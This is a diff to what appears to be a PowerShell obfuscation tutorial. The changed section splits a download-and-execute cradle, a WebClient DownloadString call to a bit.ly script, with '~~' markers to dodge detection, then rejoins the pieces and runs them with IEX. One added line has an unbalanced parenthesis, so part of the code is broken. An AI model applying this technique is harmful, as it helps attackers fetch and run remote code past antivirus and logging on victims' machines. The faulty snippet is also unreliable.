@@ -443,7 +443,9 @@ The above string can be obfuscated using **powershell special characters:** **`*
 
 ---
 
-      --replace string syntax
+      [ -Replace powershell string syntax ]
+      Build a variable named $encoded with the 'SPLIT' syscall inside, and use $encoded.Replace("~~","")
+      to 'de-split' the syscall into a new local variable named $decoded, to be called at run-time.
 
 <br />
 
@@ -453,10 +455,12 @@ The above string can be obfuscated using **powershell special characters:** **`*
 - String obfuscated<br />
 
       $encoded= "(New-Object Net.We~~bClient).Downlo~~adString('https://bi~~t.ly/L3g1t.ps1')"
-      IEX ($encoded.Replace("~~","") | IEX
+      $decoded = $encoded.Replace("~~","")
+      IEX $decoded
 
-      [ and -Replace which is case-sensitive replace ]
-      IEX ($encoded-Replace "~~","") | IEX
+      [ OR -Replace which is case-sensitive replace ]
+      $decoded = $encoded-Replace "~~","")
+      IEX $decoded
 
 
 ![powershell obfuscation](http://i.)
